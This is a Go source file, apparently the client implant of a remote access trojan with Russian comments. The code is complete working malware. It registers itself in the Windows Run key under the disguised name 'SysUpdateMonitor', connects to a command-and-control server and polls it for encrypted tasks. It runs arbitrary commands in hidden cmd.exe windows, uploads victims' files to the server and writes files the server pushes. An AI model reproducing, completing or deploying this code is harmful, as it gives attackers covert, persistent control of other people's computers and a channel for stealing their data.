package main

import (
	"bufio"
	"context"
	"io"
	"os"
	"os/exec"
	"syscall"
	"time"

	"rat/internal/crypto"
	pb "rat/internal/proto"

	"github.com/google/uuid"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/charmap"
	"golang.org/x/text/transform"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/proto"
)

const CHUNK_SIZE = 512 * 1024 // размер одного чанка равен 512кб

var (
	C2         string                // адрес с2 сервера задается при сборке (см. мейкфайл)
	ClientId   = uuid.New().String() // айдишник клиента
	SessionKey []byte                // ключ текущей сессии
)

// функция для изменения кодировки текста из cp866 (кодировка cmd в винде) в utf-8 для нормальной работы proto.Marshal (принимает только utf-8)
func cp866ToUTF8(b []byte) string {
	result, _, err := transform.Bytes(charmap.CodePage866.NewDecoder(), b)
	if err != nil {
		return string(b)
	}
	return string(result)
}

// функция, которая прописывает путь к исполняемому файлу в ключ автозапуска реестра
func ensurePersistence() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	if val, _, err := k.GetStringValue("SysUpdateMonitor"); err != nil || val != exe {
		k.SetStringValue("SysUpdateMonitor", exe)
	}
}

// установка соединения и опрос тасков
func runClient() {
	// установка соединения с c2
	conn, err := grpc.NewClient(C2, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return
	}
	defer conn.Close()
	client := pb.NewClientServiceClient(conn)
	if !handshake(client) {
		return
	}
	for {
		// получение таски (таймаут 20 секунд на случай сетевых задержек)
		cntx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		envelope, err := client.GetTask(cntx, &pb.PollRequest{ClientId: ClientId})
		cancel()
		if err != nil {
			time.Sleep(2 * time.Second) // повторный опрос, если ошибка сети
			continue
		}
		if len(envelope.EncryptedData) > 0 {
			processTask(client, envelope) // обработка таски
		}
		time.Sleep(time.Second) // пауза между опросами сервера
	}
}

// регистрация клиента и обмен ключами
func handshake(client pb.ClientServiceClient) bool {
	priv, pub, err := crypto.GenKeyPair() // клиентская пара ключей
	if err != nil {
		return false
	}
	hostname, _ := os.Hostname()
	resp, err := client.Register(context.Background(), &pb.RegisterRequest{
		ClientId: ClientId, Hostname: hostname, Os: "Windows", PublicKey: pub,
	}) // отправка публичного ключа
	if err != nil {
		return false
	}
	SessionKey, err = crypto.GetAESKey(priv, resp.PublicKey) // вычисление ключа сессии
	return err == nil
}

// выполнение таски
func processTask(client pb.ClientServiceClient, env *pb.TaskEnvelope) {
	data, err := crypto.Decrypt(env.EncryptedData, env.InitV, SessionKey) // дешифрование тела задания
	if err != nil {
		return
	}
	var task pb.Task
	if err := proto.Unmarshal(data, &task); err != nil { // десериализируем
		return
	}
	stream, err := client.SendResult(context.Background()) // открывается клиентский стрим для отправки результата на c2
	if err != nil {
		return
	}
	switch task.Type {
	case "cmd":
		// выполнение в cmd.exe
		cmd := exec.Command("cmd")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
			CmdLine:    "cmd.exe /c " + task.Command,
		}
		out, err := cmd.CombinedOutput() // перехват вывода
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		sendResult(stream, task.TaskId, task.Command, cp866ToUTF8(out), errStr) // отправка результата
	case "download":
		sendFile(stream, task.TaskId, task.Command, task.FilePath) // отправка файла по указанному пути на сервер
	case "upload":
		receiveFile(stream, &task) // принятие посланного сервером файла
	}
	stream.CloseAndRecv() // закрытие стрима
}

// сохранение файла на клиенте
func receiveFile(stream pb.ClientService_SendResultClient, task *pb.Task) {
	if len(task.FileData) == 0 {
		sendResult(stream, task.TaskId, task.Command, "", "no file data") // пустые файлы не записываются
	}
	savePath := task.FilePath // определение пути сохранения
	if savePath == "" {
		savePath = task.FileName // если было пустым, то называем идентично полученному файлу в корневой директории
	}
	if savePath == "" {
		sendResult(stream, task.TaskId, task.Command, "", "no target path") // если путь сохранения все еще пустой, то возвращаем ошибку
		return
	}
	// создаем файл
	if err := os.WriteFile(savePath, task.FileData, 0644); err != nil {
		sendResult(stream, task.TaskId, task.Command, "", err.Error())
		return
	}
	sendResult(stream, task.TaskId, task.Command, "file saved: "+savePath, "")
}

// отправка файла на сервер
func sendFile(stream pb.ClientService_SendResultClient, taskId, command, path string) {
	info, err := os.Stat(path) // проверка доступности файла
	if err != nil {
		if os.IsNotExist(err) {
			sendResult(stream, taskId, command, "", "not found: "+path)
		} else {
			sendResult(stream, taskId, command, "", err.Error())
		}
		return
	}
	if info.IsDir() {
		sendResult(stream, taskId, command, "", path+" is a dir")
		return
	}
	f, err := os.Open(path)
	if err != nil {
		sendResult(stream, taskId, command, "", err.Error())
		return
	}
	defer f.Close()
	buf := make([]byte, CHUNK_SIZE) // слайс размером с чанк
	reader := bufio.NewReader(f)
	isLast := false
	for !isLast { // пока не прочитан весь файл
		n, err := reader.Read(buf) // чтение файла в буфер
		if err != nil && err != io.EOF {
			sendResult(stream, taskId, command, "", err.Error())
			return
		}
		isLast = (err == io.EOF || n == 0) // проверка конца файла
		chunk := buf[:n]                   // заполнение одного чанка
		if n == 0 {
			chunk = []byte{}
		}
		// структура результата таски
		res := &pb.TaskResult{
			TaskId:    taskId,
			Command:   command,
			FileName:  path,
			FileChunk: chunk,
			IsLast:    isLast,
		}
		data, err := proto.Marshal(res) // сериализация
		if err != nil {
			return
		}
		enc, initV, err := crypto.Encrypt(data, SessionKey) // шифрование
		if err != nil {
			return
		}
		stream.Send(&pb.ResultEnvelope{
			ClientId: ClientId, EncryptedData: enc, InitV: initV,
		}) // отправка данных на сервер
		if isLast {
			break // если передан весь файл, то цикл прекращается
		}
	}
}

// отправка результата
func sendResult(stream pb.ClientService_SendResultClient, taskId, command, out, errStr string) {
	res := &pb.TaskResult{
		TaskId:  taskId,
		Command: command,
		Output:  out,
		Error:   errStr,
	}
	data, err := proto.Marshal(res)
	if err != nil {
		return
	}
	enc, initV, err := crypto.Encrypt(data, SessionKey) // шифрование результата таски
	if err != nil {
		return
	}
	stream.Send(&pb.ResultEnvelope{
		ClientId: ClientId, EncryptedData: enc, InitV: initV,
	}) // отправка
}

func main() {
	ensurePersistence() // прописывание в автозагрузку

	for {
		runClient()
		time.Sleep(5 * time.Second) // при разрыве подключения программа ждет 5 секунд и пытается установить соединение снова
	}
}
